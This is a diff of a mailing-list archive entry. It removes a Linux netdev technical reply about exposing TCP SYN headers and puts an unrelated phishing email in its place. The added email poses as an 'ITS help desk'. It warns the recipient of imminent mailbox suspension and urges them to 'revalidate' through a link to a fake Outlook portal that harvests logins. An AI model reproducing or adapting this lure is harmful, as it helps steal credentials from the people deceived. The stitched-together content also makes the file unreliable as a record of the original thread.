@@ -1,50 +1,190 @@
-From: Eric Dumazet <eric.dumazet-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-Subject: Re: [PATCH net-next] tcp: provide SYN headers for passive
- connections
-Date: Mon, 04 May 2015 08:12:10 -0700
-Message-ID: <1430752330.3711.180.camel@edumazet-glaptop2.roam.corp.google.com>
-References: <1430502237-5619-1-git-send-email-emunson@akamai.com>
-	 <1430505777.3711.135.camel@edumazet-glaptop2.roam.corp.google.com>
-	 <CALx6S34ftz_wDoPwcJg_cMQu4QtnBJF-=d+gF5ieTA=d=r31-Q@mail.gmail.com>
-	 <20150501201417.GB6113@akamai.com>
-	 <1430511800.3711.138.camel@edumazet-glaptop2.roam.corp.google.com>
-	 <20150501202908.GC6113@akamai.com>
-	 <1430512894.3711.140.camel@edumazet-glaptop2.roam.corp.google.com>
-	 <1430714086.3711.165.camel@edumazet-glaptop2.roam.corp.google.com>
-	 <CABrhC0nmsfAyHgJX8zEBDBVfFN=2qXKy7cO0Kbp9R9UCeEYowg@mail.gmail.com>
+From: "Kalal, Beth R" <Beth.Kalal@providence.org>
+Subject: RE: ITS help desk
+Date: Mon, 4 May 2015 14:35:00 +0000
+Message-ID: <7FF567186AEB8640BC20A682C345A9753AB4D59B@WN35118.or.providence.org>
+References: <7FF567186AEB8640BC20A682C345A9753AB49F0B@WN35118.or.providence.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: 7bit
-Cc: Eric B Munson <emunson-JqFfY2XvxFXQT0dZR+AlfA@public.gmane.org>,
-	Tom Herbert <tom-BjP2VixgY4xUbtYUoyoikg@public.gmane.org>,
-	"David S. Miller" <davem-fT/PcQaiUtIeIZ0/mPfg9Q@public.gmane.org>, linux-api-u79uwXL29TY76Z2rM5mHXA@public.gmane.org,
-	netdev <netdev-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-To: John Heffner <johnwheffner-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-Return-path: <linux-api-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-In-Reply-To: <CABrhC0nmsfAyHgJX8zEBDBVfFN=2qXKy7cO0Kbp9R9UCeEYowg-JsoAwUIsXosN+BqQ9rBEUg@public.gmane.org>
-Sender: linux-api-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-List-Id: netdev.vger.kernel.org
+Content-Type: text/plain; charset=iso-8859-1
+Content-Transfer-Encoding: QUOTED-PRINTABLE
+To: "Kalal, Beth R" <Beth.Kalal@providence.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from mail-by2hn0254.outbound.protection.outlook.com ([207.46.100.254]:14473
+	"EHLO na01-by2-obe.outbound.protection.outlook.com"
+	rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
+	id S1750943AbbEDPUe convert rfc822-to-8bit (ORCPT
+	<rfc822;netdev@vger.kernel.org>); Mon, 4 May 2015 11:20:34 -0400
+In-Reply-To: <7FF567186AEB8640BC20A682C345A9753AB49F0B@WN35118.or.providence.org>
+Content-Language: en-US
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-On Mon, 2015-05-04 at 10:41 -0400, John Heffner wrote:
+Dear Mailbox User
 
-> Nice idea, seems handy.  But a couple (somewhat related) questions:
-> 
-> * Other than convenience, are there reasons not use an existing, more
-> general-purpose and portable mechanism like pcap?  (Permissions, I
-> guess?)
+   Please be informed that your Email account on file has been listed f=
+or suspension and will be disabled shortly if not activated now. Errors=
+ were discovered in your account. For security reasons, you are require=
+d to secure and revalidate your mailbox by clicking here on update port=
+al<http://outlook-web--app.jigsy.com/> and fill out the requirements to=
+ automatically Revalidate your mailbox and Upgrade its quota size.
 
-Very hard to synchronize when say you have 32 listeners sharing a single
-port (SO_REUSEPORT), and receive one million SYN per second (when my TCP
-listener scaling work is finished).
 
-libpcap here would be a serious bottleneck, even with a clever FANIN
-support on the af_packet sockets, considering use of multiqueue NIC.
+ITS help desk
+ADMIN TEAM
+ =A9 1995 - 2015 Outlook Communications
 
-> * Are there conditions where, for security purposes, you don't want an
-> application to have access to the raw SYNs?
 
-Not that we are aware of : We restrict the access to IP + TCP headers,
-for the passive part. All information that is available there was
-provided by the remote peer on a 'open way' anyway.
 
-Thanks.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+________________________________
+
+This message is intended for the sole use of the addressee, and may con=
+tain information that is privileged, confidential and exempt from discl=
+osure under applicable law. If you are not the addressee you are hereby=
+ notified that you may not use, copy, disclose, or distribute to anyone=
+ the message or any information contained in the message. If you have r=
+eceived this message in error, please immediately advise the sender by =
+reply email and delete this message.
